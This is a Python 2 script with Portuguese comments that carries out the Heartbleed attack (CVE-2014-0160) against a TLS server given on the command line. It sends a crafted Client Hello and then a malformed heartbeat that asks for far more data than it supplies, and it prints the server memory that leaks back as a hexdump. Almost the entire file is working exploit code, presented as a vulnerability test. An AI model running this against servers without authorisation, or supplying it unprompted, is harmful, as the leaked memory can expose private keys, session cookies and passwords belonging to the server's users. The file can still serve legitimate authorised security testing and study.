#!/usr/bin/env python
# -*- coding: UTF-8 -*-

"""
  Esse arquivo faz a tentativa de 
  ataque de HeartBleed


  Modificado em 02 de janeiro de 2017
  por Vitor Mazuco (vitor.mazuco@gmail.com)
"""

# Importa as bibliotecas necessárias 
import sys
import struct
import socket
import time
import select
import re
from optparse import OptionParser
 
# Algumas opções de portas
options = OptionParser(usage='%prog server [options]', description='Teste de vulnerabilidade de SSL (CVE-2014-0160)')
options.add_option('-p', '--port', type='int', default=443, help='Porta TCP a testar (padrão: 443)')
 
def h2bin(x):
    return x.replace(' ', '').replace('\n', '').decode('hex')
 
version = []
version.append(['SSL 3.0','03 00'])
version.append(['TLS 1.0','03 01'])
version.append(['TLS 1.1','03 02'])
version.append(['TLS 1.2','03 03'])
 
# Função que cria o Hello para testar a resposta do servidor
def create_hello(version):
    hello = h2bin('16 ' + version + ' 00 dc 01 00 00 d8 ' + version + ''' 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
    return hello
 
def create_hb(version):
    hb = h2bin('18 ' + version + ' 00 03 01 40 00')
    return hb
 
def hexdump(s):
    for b in xrange(0, len(s), 16):
        lin = [c for c in s[b : b + 16]]
        hxdat = ' '.join('%02X' % ord(c) for c in lin)
        pdat = ''.join((c if 32 <= ord(c) <= 126 else '.' )for c in lin)
        print '  %04x: %-48s %s' % (b, hxdat, pdat)
    print
 
def recvall(s, length, timeout=5):
    endtime = time.time() + timeout
    rdata = ''
    remain = length
    while remain > 0:
        rtime = endtime - time.time()
        if rtime < 0:
            return None
        r, w, e = select.select([s], [], [], 5)
        if s in r:
            data = s.recv(remain)
            # EOF?
            if not data:
                return None
            rdata += data
            remain -= len(data)
    return rdata
 
 
def recvmsg(s):
    hdr = recvall(s, 5)
    if hdr is None:
        print 'EOF inesperado recebendo cabeçalho de registro - conexão fechada do servidor'
        return None, None, None
    typ, ver, ln = struct.unpack('>BHH', hdr)
    pay = recvall(s, ln, 10)
    if pay is None:
        print 'EOF inesperado recebendo payload de registro - conexão fechada do servidor'
        return None, None, None
    print ' ... Mensagem recebida: type = %d, ver = %04x, length = %d' % (typ, ver, len(pay))
    return typ, ver, pay
 
def hit_hb(s,hb):
    s.send(hb)
    while True:
        typ, ver, pay = recvmsg(s)
        if typ is None:
            print 'Nenhuma resposta de heartbeat recebida, servidor provavelmente não está vulnerável'
            return False
 
        if typ == 24:
            print 'Resposta do heartbeat recebida:'
            hexdump(pay)
            if len(pay) > 3:
                print 'AVISO: o servidor retornou mais dados do que deveria - o servidor está vulnerável!'
            else:
                print 'O servidor processou heartbeat malformados, mas não retornou nenhum dado extra.'
            return True
 
        if typ == 21:
            print 'Alerta recebido:'
            hexdump(pay)
            print 'Servidor retornado erro, provavelmente não é vulnerável'
            return False
 
def main():
    opts, args = options.parse_args()
    if len(args) < 1:
        options.print_help()
        return
    for i in range(len(version)):
        print 'Tentando ' + version[i][0] + '...'
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        print 'Conectando...'
        sys.stdout.flush()
        s.connect((args[0], opts.port))
        print 'Enviando Client Hello...'
        sys.stdout.flush()
        s.send(create_hello(version[i][1]))
        print 'Esperando pelo Server Hello...'
        sys.stdout.flush()
        while True:
            typ, ver, pay = recvmsg(s)
            if typ == None:
                print 'Servidor fechado conexão sem enviar o Server Hello.'
                return
            # Procure o servidor hello feito na mensagem.
            if typ == 22 and ord(pay[0]) == 0x0E:
                break
 
        print 'Enviando solicitação de heartbeat...'
        sys.stdout.flush()
        s.send(create_hb(version[i][1]))
        if hit_hb(s,create_hb(version[i][1])):
            # Pare se estiver vulnerável
            break
 
if __name__ == '__main__':
    main()

